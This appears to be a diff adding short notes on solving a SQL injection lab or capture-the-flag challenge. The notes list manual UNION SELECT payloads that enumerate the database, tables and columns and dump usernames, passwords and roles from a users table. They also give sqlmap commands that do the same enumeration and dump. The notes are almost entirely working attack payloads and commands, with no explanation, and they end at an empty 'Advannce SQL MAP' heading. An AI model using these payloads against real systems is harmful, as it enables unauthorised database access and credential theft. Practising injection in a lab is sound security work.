@@ -1,0 +1,18 @@
+﻿Manual
+
+1) ' UNION SELECT 1,2,3,database() -- 
+2) ' UNION select 1,2,3,table_name FROM information_schema.tables WHERE table_schema='sqli' -- 
+3) ' UNION SELECT 1,2,3,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name="users" AND table_schema='sqli' -- 
+4) ' UNION SELECT 1,2,3,GROUP_CONCAT(id,username,password,role) FROM users -- 
+
+SQL MAP:
+
+1) python sqlmap.py –u "http://192.168.1.123/challenge/SQLI/api.php?username=user_aaaa&password=bbbbb" --threads=2 --dbs
+OR
+1) python sqlmap.py -r data --threads=2 --dbs
+
+2) python sqlmap.py -r data --threads=2 -D sqli --tables
+3) python sqlmap.py -r data --threads=2 -D sqli -T users --columns
+4) python sqlmap.py -r data --threads=2 -D sqli -T users -C id --dump
+
+Advannce SQL MAP:
